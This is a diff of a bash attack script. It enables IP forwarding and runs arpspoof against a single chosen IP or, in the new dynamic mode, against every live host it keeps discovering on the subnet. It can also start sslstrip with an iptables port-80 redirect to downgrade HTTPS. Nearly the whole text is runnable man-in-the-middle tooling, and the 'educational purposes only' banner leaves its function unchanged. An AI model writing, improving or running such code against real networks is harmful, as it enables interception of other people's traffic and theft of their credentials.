@@ -1,19 +1,18 @@
 #!/bin/bash
 
-# Colors for output
+# Colors for formatting
 RED='\033[0;31m'
 GREEN='\033[0;32m'
-YELLOW='\033[0;33m'        # Normal Yellow
-YELLOW_BRIGHT='\033[1;33m' # Bright Yellow
-NC='\033[0m' # No Color
+YELLOW='\033[0;33m'
+NC='\033[0m' # No color
 
-# Display a warning message in bright yellow
-echo -e "${YELLOW_BRIGHT}***************************************************************************${NC}"
-echo -e "${YELLOW_BRIGHT}*                                                                         *${NC}"
-echo -e "${YELLOW_BRIGHT}*   WARNING: This script is for educational purposes only.                *${NC}"
-echo -e "${YELLOW_BRIGHT}*   Unauthorized use is illegal and may result in severe consequences.    *${NC}"
-echo -e "${YELLOW_BRIGHT}*                                                                         *${NC}"
-echo -e "${YELLOW_BRIGHT}***************************************************************************${NC}"
+# Warning message
+echo -e "${YELLOW}***************************************************************************${NC}"
+echo -e "${YELLOW}*                                                                         *${NC}"
+echo -e "${YELLOW}*   WARNING: This script is for educational purposes only.                *${NC}"
+echo -e "${YELLOW}*   Unauthorized use is illegal and may result in severe consequences.    *${NC}"
+echo -e "${YELLOW}*                                                                         *${NC}"
+echo -e "${YELLOW}***************************************************************************${NC}"
 
 # Ensure the script is run as root
 if [[ $EUID -ne 0 ]]; then
@@ -25,13 +24,15 @@ fi
 echo -e "${YELLOW}Enabling IP forwarding...${NC}"
 echo 1 > /proc/sys/net/ipv4/ip_forward
 
-# Function to handle cleanup on CTRL+C
+# Cleanup function for exiting
 function cleanup() {
-    echo -e "${RED}\nAttack stopped. Cleaning up...${NC}"
+    echo -e "${RED}\nCleaning up...${NC}"
     echo 0 > /proc/sys/net/ipv4/ip_forward
     pkill arpspoof
     pkill sslstrip
     iptables -t nat -F
+    iptables -F
+    iptables -X
     exit 0
 }
 
@@ -47,7 +48,7 @@ if [[ -z "$router" ]]; then
     exit 1
 fi
 
-# Function to list and select network interfaces
+# Function to select a network interface
 function select_interface() {
     while true; do
         interfaces=$(ip link show | grep -E "^[0-9]+:" | awk -F': ' '{print $2}')
@@ -70,129 +71,102 @@ function select_interface() {
     done
 }
 
-# Call the function to select interface
+# Call the function to select the network interface
 select_interface
 
-# Function to perform the attack on a single target
-function attack_single() {
-    while true; do
-        read -p "Enter the target device's IP: " target
-        if [[ -n "$target" ]]; then
-            echo -e "${GREEN}Preparing to attack device $target...${NC}"
-            break
-        else
-            echo -e "${RED}Invalid input. Please enter a valid IP address.${NC}"
-        fi
-    done
-
-    # Ask about sslstrip usage
-    echo -e "${YELLOW}SSLStrip Option:${NC}"
-    echo -e "SSLStrip downgrades HTTPS connections to HTTP, allowing you to intercept and read secure traffic."
-
-    while true; do
-        read -p "Do you want to use sslstrip? (yes/y or no/n): " use_sslstrip
-        if [[ "$use_sslstrip" =~ ^(yes|y)$ ]]; then
-            echo -e "${YELLOW}Starting sslstrip...${NC}"
-            sslstrip -l 8080 &
-            echo -e "${YELLOW}Configuring iptables to redirect HTTP traffic...${NC}"
-            iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
-            echo -e "${GREEN}sslstrip is running. HTTPS traffic will be downgraded to HTTP.${NC}"
-            break
-        elif [[ "$use_sslstrip" =~ ^(no|n)$ ]]; then
-            echo -e "${GREEN}sslstrip will not be used.${NC}"
-            break
-        else
-            echo -e "${RED}Invalid input. Please answer with 'yes/y' or 'no/n'. Try again.${NC}"
-        fi
-    done
-
-    echo -e "${GREEN}Starting attack on device $target...${NC}"
-    echo -e "${RED}To stop the attack, press CTRL+C.${NC}"
-    sudo arpspoof -i $selected_iface -t $target $router &
-    sudo arpspoof -i $selected_iface -t $router $target &
-    wait
-}
-
-# Function to perform the attack on the entire network
-function attack_all() {
-    # Detect the network range and mask
-    network_info=$(ip -o -f inet addr show $selected_iface | awk '/scope global/ {print $4}')
-    network=$(echo $network_info | cut -d'/' -f1)
-    cidr=$(echo $network_info | cut -d'/' -f2)
-
-    # Calculate the IP range based on CIDR
-    IFS=. read -r i1 i2 i3 i4 <<< "${network}"
-    case $cidr in
-        24)
-            start_ip="${i1}.${i2}.${i3}.1"
-            end_ip="${i1}.${i2}.${i3}.254"
-            ;;
-        16)
-            start_ip="${i1}.${i2}.0.1"
-            end_ip="${i1}.${i2}.255.254"
-            ;;
-        12)
-            start_ip="${i1}.${i2}.0.1"
-            end_ip="${i1}.${i2}.15.254"
-            ;;
-        *)
-            echo -e "${RED}Unsupported CIDR length: /$cidr${NC}"
-            exit 1
-            ;;
-    esac
-
-    echo -e "${GREEN}Preparing to attack the network range: $start_ip - $end_ip (${network_info})...${NC}"
-
-    # Ask about sslstrip usage
-    echo -e "${YELLOW}SSLStrip Option:${NC}"
-    echo -e "SSLStrip downgrades HTTPS connections to HTTP, allowing you to intercept and read secure traffic."
-
-    while true; do
-        read -p "Do you want to use sslstrip? (yes/y or no/n): " use_sslstrip
-        if [[ "$use_sslstrip" =~ ^(yes|y)$ ]]; then
-            echo -e "${YELLOW}Starting sslstrip...${NC}"
-            sslstrip -l 8080 &
-            echo -e "${YELLOW}Configuring iptables to redirect HTTP traffic...${NC}"
-            iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
-            echo -e "${GREEN}sslstrip is running. HTTPS traffic will be downgraded to HTTP.${NC}"
-            break
-        elif [[ "$use_sslstrip" =~ ^(no|n)$ ]]; then
-            echo -e "${GREEN}sslstrip will not be used.${NC}"
-            break
-        else
-            echo -e "${RED}Invalid input. Please answer with 'yes/y' or 'no/n'. Try again.${NC}"
-        fi
-    done
-
-    echo -e "${GREEN}Starting attack on the network range: $start_ip - $end_ip (${network_info})...${NC}"
-    echo -e "${RED}To stop the attack, press CTRL+C.${NC}"
-
-    # Perform the attack for each IP in the range
-    for ip in $(seq 1 254); do
-        target_ip="${i1}.${i2}.${i3}.${ip}"
-        sudo arpspoof -i $selected_iface -t $target_ip $router &
-        sudo arpspoof -i $selected_iface -t $router $target_ip &
-        sleep 0.2  # Add a small delay to reduce load on the system
-    done
-    wait
-}
-
-# Display the detected router
+# Display detected router
 echo -e "${GREEN}Router detected: $router${NC}"
 
-# Ask the user for the attack type
+# Function to enable SSLStrip
+function enable_sslstrip() {
+    while true; do
+        echo -e "${YELLOW}SSLStrip downgrades HTTPS connections to HTTP, allowing you to intercept and read secure traffic.${NC}"
+        echo -e "${YELLOW}Do you want to enable SSLStrip? (yes/y or no/n):${NC}"
+        read -p "" use_sslstrip
+        if [[ "$use_sslstrip" =~ ^(yes|y)$ ]]; then
+            echo -e "${YELLOW}Starting SSLStrip...${NC}"
+            sslstrip -l 8080 &
+            echo -e "${YELLOW}Configuring iptables to redirect HTTP traffic...${NC}"
+            iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+            echo -e "${GREEN}SSLStrip is running. HTTPS traffic will be downgraded to HTTP.${NC}"
+            break
+        elif [[ "$use_sslstrip" =~ ^(no|n)$ ]]; then
+            echo -e "${GREEN}SSLStrip will not be used.${NC}"
+            break
+        else
+            echo -e "${RED}Invalid input. Please answer with 'yes/y' or 'no/n'. Try again.${NC}"
+        fi
+    done
+}
+
+# Function to attack a single device
+function attack_single() {
+    read -p "Enter the target device's IP: " target_ip
+
+    echo -e "${GREEN}Preparing to attack the target device...${NC}"
+    
+    # Ask about SSLStrip usage before starting the attack
+    echo -e "${YELLOW}SSLStrip Option:${NC}"
+    enable_sslstrip
+
+    echo -e "${GREEN}Starting ARP poisoning attack on ${target_ip}...${NC}"
+    echo -e "${RED}Press CTRL+C to stop the attack.${NC}"
+
+    arpspoof -i $selected_iface -t $target_ip $router &
+    arpspoof -i $selected_iface -t $router $target_ip &
+    wait
+}
+
+# Function to attack the entire network dynamically
+function attack_all_dynamic() {
+    echo -e "${GREEN}Starting dynamic network scanning and ARP spoofing...${NC}"
+    network=$(ip -o -f inet addr show $selected_iface | awk '/scope global/ {print $4}')
+    IFS=. read -r i1 i2 i3 i4 <<< $(echo $network | cut -d'/' -f1)
+
+    # Ask about SSLStrip usage before starting the attack
+    echo -e "${YELLOW}SSLStrip Option:${NC}"
+    enable_sslstrip
+
+    # Use an associative array to track attacked devices
+    declare -A attacked_devices
+
+    while true; do
+        # Scan the network
+        for ip in $(seq 1 254); do
+            target_ip="${i1}.${i2}.${i3}.${ip}"
+            if ping -c 1 -W 1 $target_ip &>/dev/null; then
+                if [[ -z "${attacked_devices[$target_ip]}" ]]; then
+                    echo -e "${YELLOW}Discovered new device: $target_ip${NC}"
+                    attacked_devices[$target_ip]=1
+
+                    # Launch ARP spoofing attack on the new device
+                    echo -e "${YELLOW}Launching ARP spoofing on $target_ip...${NC}"
+                    arpspoof -i $selected_iface -t $target_ip $router &
+                    arpspoof -i $selected_iface -t $router $target_ip &
+                fi
+            fi
+        done
+        sleep 60 # Pause for 1 minute before rescanning the network
+    done
+}
+
+# Prompt the user to choose an attack type
 while true; do
     echo "Select the type of attack:"
     echo "1) Single Device"
     echo "2) Entire Network"
     read -p "Enter your choice (1/2): " choice
-    if [[ "$choice" == "1" ]]; then
-        attack_single
-        break
-    elif [[ "$choice" == "2" ]]; then
-        attack_all
-        break
-    else
-        echo -e "${RED}Invalid choice. Please try again.${NC}"
-    fi
+    case $choice in
+        1)
+            attack_single
+            break
+            ;;
+        2)
+            attack_all_dynamic
+            break
+            ;;
+        *)
+            echo -e "${RED}Invalid choice. Please enter 1 or 2.${NC}"
+            ;;
+    esac
 done
